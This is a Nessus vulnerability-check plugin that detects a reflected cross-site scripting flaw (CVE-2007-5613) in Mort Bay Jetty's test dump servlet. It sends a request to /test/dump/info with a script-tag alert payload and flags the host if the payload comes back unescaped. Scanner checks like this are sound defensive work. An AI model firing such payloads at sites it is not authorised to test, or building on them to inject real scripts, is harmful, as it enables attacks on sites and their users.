#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(29219);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2007-5613");
  script_bugtraq_id(26697);
  script_xref(name:"OSVDB", value:"42497");

  script_name(english:"Mort Bay Jetty Dump Servlet (webapps/test/jsp/dump.jsp) XSS");
  script_summary(english:"Checks for an XSS flaw in Jetty's dump servlet");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a JSP application that is affected by a
cross-site scripting vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote instance of Mort Bay Jetty includes a test servlet,
'webapps/test/jsp/dump.jsp', that fails to sanitize user-supplied
input before using it to generate dynamic content.  An unauthenticated
remote attacker may be able to leverage this issue to inject arbitrary
HTML or script code into a user's browser to be executed within the
security context of the affected site. 

Similar issues reportedly exist with the 'webapps/snoop.jsp'' servlet
as well as Jetty itself, although Nessus did not check for them." );
 script_set_attribute(attribute:"see_also", value:"http://www.kb.cert.org/vuls/id/237888" );
 script_set_attribute(attribute:"see_also", value:"http://jira.codehaus.org/browse/JETTY-452" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f964c0d9" );
 script_set_attribute(attribute:"solution", value:
"Remove the Test webapp if operating in a production environment and
upgrade to Mort Bay Jetty 6.1.6 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_kb_item("Services/www");
if (!port) port = 8080;
if (!get_port_state(port)) exit(0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


# Unless we're paranoid, make sure the banner looks like Mort Bay Jetty.
#
# nb: the Server Response header can be suppressed; eg, see
#     <http://docs.codehaus.org/display/JETTY/How+to+suppress+the+Server+HTTP+header>.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner || "Server: Jetty(" >!< banner) exit(0);
}


# Send a request to exploit the flaw.
key = "nessus";
val = string(unixtime(), "<script>alert(", SCRIPT_NAME, ")</script>");

req = http_get(item:string("/test/dump/info?", key, "=", val), port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);


# There's a problem if our exploit appears along with the time in a form.
if (string('right">', key, ':&nbsp;</th><td>', val) >< res) 
{
  security_warning(port);
  set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
}
